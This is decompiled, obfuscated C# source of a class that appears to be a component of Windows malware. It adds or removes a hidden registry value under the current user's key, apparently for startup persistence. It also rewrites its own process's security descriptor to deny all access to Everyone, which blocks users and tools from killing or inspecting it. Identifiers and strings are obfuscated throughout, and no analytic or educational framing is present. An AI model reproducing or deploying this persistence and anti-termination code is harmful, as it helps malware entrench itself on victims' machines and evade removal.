using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gtzdezosLTmcL;

internal sealed class AFyyeiAETeADU
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr ItwqqbAiTz, int SGTBmKEHXT, [Out] byte[] NQjVbzxjIq, uint WYikAGIwYz, out uint wnondTyxgXbBip);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr yMudpVNFpSjz, int ZAyYsgRAddkDkXGS, [In] byte[] pWnKTQIxZqNEt);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void ZcmAsJhSoOPF(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107368739));
			if (bool_0 && registryKey.GetValue(getString_0(107369142)) != null)
			{
				registryKey.DeleteValue(getString_0(107369142));
			}
			else
			{
				registryKey.SetValue(getString_0(107369142), getString_0(107395802));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor BcJLCDouhFXE(IntPtr intptr_0)
	{
		byte[] nQjVbzxjIq = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, nQjVbzxjIq, 0u, out var wnondTyxgXbBip);
		if ((long)wnondTyxgXbBip > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, nQjVbzxjIq = new byte[wnondTyxgXbBip], wnondTyxgXbBip, out wnondTyxgXbBip))
		{
			return null;
		}
		return new RawSecurityDescriptor(nQjVbzxjIq, 0);
	}

	private void SqJByClmiUzZyH(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void lSTDkhLUuqrpAl()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = BcJLCDouhFXE(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			SqJByClmiUzZyH(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static AFyyeiAETeADU()
	{
		Strings.CreateGetStringDelegate(typeof(AFyyeiAETeADU));
	}
}
